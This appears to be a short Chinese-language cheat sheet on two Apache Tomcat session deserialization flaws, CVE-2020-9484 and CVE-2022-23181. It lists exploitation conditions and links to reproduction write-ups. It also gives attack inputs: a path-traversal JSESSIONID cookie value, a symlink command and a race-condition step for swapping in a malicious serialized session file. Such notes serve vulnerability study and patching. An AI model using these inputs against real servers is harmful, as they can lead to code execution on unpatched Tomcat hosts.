# Tomcat Session

```
攻击者能够控制服务器上文件的内容和文件名称。

服务器PersistenceManager配置中使用了FileStore。

Tomcat依赖jar包中存在反序列化利用链。

攻击者知道使用的FileStore存储位置并且知道其目录下存在的任意文件名称。(CVE-2022-23181)

满足条件竞争，创建Symlinks文件，并在完成文件验证后瞬间覆盖恶意序列化文件。(CVE-2022-23181)
```

## CVE-2020-9484

[Tomcat Session(CVE-2020-9484)反序列化漏洞复现](https://www.freebuf.com/vuls/245232.html)  

```xml
CVE-2020-9484
JSESSIONID=../../../../tmp/exp.session
```

## CVE-2022-23181

[Apache Tomcat权限提升漏洞分析（CVE-2022-23181）](https://mp.weixin.qq.com/s/sQH0CbiSHdpsoJf7ABPrtA)

```xml
CVE-2022-23181
ln -s /Users/xxxx/java/soft/apache-tomcat-8.5.42/work/Catalina/localhost/ROOT/a.session ../../../tmp/exp.session
JSESSIONID=../../../tmp/exp.session
然后条件竞争去修改/tmp/exp.session
```
**trick**:
new File("ceshi.session").getCanonicalFile()
如果是Symlinks文件就返回本来的文件名
